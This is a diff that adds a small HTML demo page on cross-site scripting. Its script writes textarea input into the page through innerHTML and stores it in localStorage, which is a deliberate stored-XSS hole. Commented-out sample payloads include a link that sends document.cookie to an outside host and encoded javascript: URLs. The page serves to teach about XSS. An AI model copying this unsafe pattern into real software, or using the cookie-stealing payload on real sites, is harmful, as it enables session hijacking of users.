@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="utf-8">
+        <title>XSS</title>
+        <style media="screen">
+            h1{
+                text-align: center;
+            }
+            textarea{
+                display: block;
+                width: 600px;
+                margin: 0 auto;
+            }
+            #show{
+                margin: 30px auto;
+                text-align: center;
+            }
+            button{
+                margin: 10px auto;
+                display: block;
+                width: 120px;
+            }
+        </style>
+    </head>
+    <body>
+        <h1>Cross site scripting</h1>
+        <!-- <a href="https://www.baidu.com"
+        onmouseover="window.location='https://m.okay.cn?token=' + escape(document.cookie)">baidu</a> -->
+        <!-- <a href="javascript:alert(String.fromCharCode(88,83,83))">dada</a> -->
+        <!-- <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">dada</a> -->
+        <textarea id="ta" rows="8" cols="80">
+        </textarea>
+        <div id="show">
+        </div>
+        <button type="button" id="button">Search</button>
+
+        <script type="text/javascript">
+            var btn = document.getElementById('button');
+            var show = document.getElementById('show');
+            var ta = document.getElementById('ta');
+            if(localStorage.getItem('ta')){
+                show.innerHTML = localStorage.getItem('ta');
+            }
+            btn.addEventListener('click',function(){
+                localStorage.setItem('ta',ta.value);
+                show.innerHTML = ta.value;
+            },false);
+        </script>
+    </body>
+</html>
